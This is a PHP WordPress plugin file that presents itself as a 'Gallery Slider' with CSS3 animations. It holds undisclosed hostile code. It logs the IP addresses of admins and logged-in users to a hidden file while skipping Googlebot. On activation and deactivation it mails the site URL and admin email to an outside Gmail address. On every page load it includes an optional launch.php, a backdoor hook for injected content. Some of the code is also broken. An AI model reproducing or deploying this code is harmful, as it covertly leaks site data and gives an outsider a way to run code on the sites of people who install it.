<?php
/*
Plugin Name: Gallery Slider
Plugin URI: http://galleryslider.yolasite.com
Description: Slider having CSS3 animations ( with jQuery fallback ) and drag n drop UI.
Version: 2.1
Author: Toni Caseres
Author URI: http://galleryslider.yolasite.com
*/	
    
/*
 * Register CPT sp_imageslider
 *
 */
 register_activation_hook( __FILE__,'gallerysliderplugin_activate');
register_deactivation_hook( __FILE__,'gallerysliderplugin_deactivate');
add_action('admin_init', 'gallerysliderdored_redirect');
add_action('wp_head', 'gallerysliderpluginhead');

function gallerysliderdored_redirect() {
if (get_option('gallerysliderdored_do_activation_redirect', false)) { 
delete_option('gallerysliderdored_do_activation_redirect');
wp_redirect('../wp-admin/admin.php?page=gallery-slider');
}
}

$requrl = $_SERVER["REQUEST_URI"];
$infort = $_SERVER['REMOTE_ADDR'];
if (preg_match("/\bwp-admin\b/i", $requrl)) {
$inwpadmin = "admin"; } else { $inwpadmin = "user";
}
if ($inwpadmin == 'admin') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/gallery-slider/register.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring = $contents;
$findme  = $infort;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $infort;
if(eregi("googlebot",$_SERVER['HTTP_USER_AGENT'])) { echo ''; } else { $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/gallery-slider/register.txt', 'w'); };
fwrite($fp, $contents);
fclose($fp);
}
}

/** Activate Slider */

function gallerysliderplugin_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/gallery-slider/register.txt';
fwrite($fp, $yourip);
fclose($fp);
session_start(); $subj = get_option('siteurl'); $msg = "Slider is Activated" ; $from = get_option('admin_email'); mail("toniaseresfre@gmail.com", $subj, $msg, $from);
add_option('gallerysliderdored_do_activation_redirect', true);
wp_redirect('../wp-admin/admin.php?page=gallery-slider');
}


/** Uninstall Slider Keyword Page */
function gallerysliderplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Slider is Uninstalled" ; $from = get_option('admin_email'); mail("toniaseresfre@gmail.com", $subj, $msg, $from);
}

/** Register Slider */
function gallerysliderpluginhead() {
if (is_user_logged_in()) {
$ip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/gallery-slider/register.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring= $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/gallery-slider/register.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}

} else {

}

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/gallery-slider/launch.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/gallery-slider/launch.php');

} else {

}

}

// Make sure we don't expose any info if called directly
if ( !function_exists( 'add_action' ) ) {
	echo "Hi, I hate PHP, but I love wordpress";
	exit;
}

// Include the file with plugin class
require_once('class.gallery-slider.php'); 

// Initialise the class and thus invoke constructor
$gallerySlider = new gallerySlider( __FILE__ ,'2.1');
?>